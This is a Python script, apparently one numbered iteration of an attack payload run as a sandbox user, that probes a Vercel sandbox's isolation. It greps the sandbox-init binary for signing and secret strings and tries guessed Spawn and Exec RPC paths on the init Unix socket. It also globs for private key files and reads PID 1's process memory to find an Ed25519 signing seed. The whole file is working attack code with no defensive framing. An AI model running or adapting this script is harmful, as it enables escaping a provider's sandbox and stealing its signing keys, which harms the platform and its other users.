# -*- coding: utf-8 -*-
"""v200 payload (sandbox user): sandbox-init 签名机制深挖
1. 读 /run/vercel/share/sandbox-init 二进制字符串 (签名逻辑/header/硬编码密钥)
2. 试 SpawnService 正确包路径 + 方法
3. 找私钥文件 (find)
4. 读 /proc/1/mem 尝试找 Ed25519 seed (同 uid ptrace)"""
import socket, time, json, os, sys, re, subprocess

def log(s, maxlen=3000):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC %d]' % len(s)
    print('[%.1f] %s' % (time.time(), s), flush=True)

def punix(sp, path, body, t=8, extra=None):
    b = json.dumps(body).encode()
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sp)
        hdrs = 'POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n' % path
        hdrs += 'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n' % len(b)
        if extra:
            for k, v in extra.items():
                hdrs += '%s: %s\r\n' % (k, v)
        hdrs += '\r\n'
        s.sendall(hdrs.encode() + b)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
                if len(d) > 5000:
                    break
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        return st, d[:4000]
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''

SOCK = '/run/vercel/share/init.sock'

# ============ 1: 二进制字符串 ============
log('=== 1 binary strings ===')
try:
    st = os.stat('/run/vercel/share/sandbox-init')
    log('SBIN size=%d mode=%o' % (st.st_size, st.st_mode))
    d = open('/run/vercel/share/sandbox-init', 'rb').read()
    for kw in [b'signature', b'sign', b'ed25519', b'pubkey', b'header', b'x-sign', b'timestamp', b'nonce', b'hmac', b'Authorization', b'secret', b'private']:
        idxs = [m.start() for m in re.finditer(kw, d, re.IGNORECASE)]
        log('KW %s hits=%d' % (kw.decode(), len(idxs)))
        for i in idxs[:4]:
            seg = d[max(0, i - 80):i + 160]
            try:
                log('  ...%r...' % seg.decode(errors='replace'))
            except Exception:
                pass
except Exception as e:
    log('SBIN EXC %s' % e)

# ============ 2: SpawnService 路径/方法 ============
log('=== 2 spawn paths ===')
paths = [
    '/vercel.sandbox.spawn.v1.SpawnService/Ping',
    '/vercel.sandbox.spawn.v1.SpawnService/Kill',
    '/vercel.sandbox.spawn.v1.SpawnService/Spawn',
    '/vercel.sandbox.spawn.v1.SpawnService/Exec',
    '/vercel.sandbox.spawn.v1.SpawnService/Start',
    '/vercel.sandbox.api.spawn.v1.SpawnService/Ping',
    '/vercel.sandbox.spawn.v1.SpawnService/List',
    '/vercel.sandbox.spawn.v1.SpawnService/Get',
]
for p in paths:
    st, pay = punix(SOCK, p, {'name': 'x'}, t=4)
    log('PATH %s -> %s %r' % (p, st, pay[:250]))

# ============ 3: 找私钥文件 ============
def glob_list(pat):
    import glob
    return glob.glob(pat)

log('=== 3 find keys ===')
for pat in ['/run/vercel/share/*', '/run/*.key', '/etc/*.key', '/tmp/*.key', '/vercel/*.key', '/run/vercel/share/.key*', '/vercel/sandbox/*.key']:
    try:
        fs = glob_list(pat)
        log('GLOB %s: %s' % (pat, fs))
    except Exception as e:
        log('GLOB %s EXC %s' % (pat, e))

# ============ 4: /proc/1/mem 找 Ed25519 seed ============
log('=== 4 mem ===')
try:
    maps = open('/proc/1/maps', 'rb').read().decode(errors='replace')
    regions = []
    for line in maps.splitlines():
        parts = line.split()
        if len(parts) >= 2 and 'r' in parts[1] and 'x' not in parts[1]:
            a, b = parts[0].split('-')
            regions.append((int(a, 16), int(b, 16), parts[-1] if len(parts) > 5 else ''))
    log('MEM regions=%d' % len(regions))
    # 尝试读堆区域 (anon)
    found = 0
    with open('/proc/1/mem', 'rb') as m:
        for a, b, name in regions:
            if name == '' and (b - a) < 32 * 1024 * 1024 and (b - a) > 0:
                try:
                    m.seek(a)
                    chunk = m.read(min(b - a, 8 * 1024 * 1024))
                    # 找 "ed25519" / seed 特征 (base64 44 字符 or 32 字节随机)
                    for kw in [b'signature', b'priv', b'seed', b'key\x00']:
                        idxs = [x.start() for x in re.finditer(kw, chunk, re.IGNORECASE)]
                        if idxs:
                            for i in idxs[:3]:
                                seg = chunk[max(0, i - 40):i + 200]
                                log('MEM %x kw=%s: %r' % (a + i, kw.decode(), seg.decode(errors='replace')))
                                found += 1
                    if found > 20:
                        break
                except Exception:
                    pass
    log('MEM scan done found=%d' % found)
except Exception as e:
    log('MEM EXC %s' % e)

log('V200_DONE')
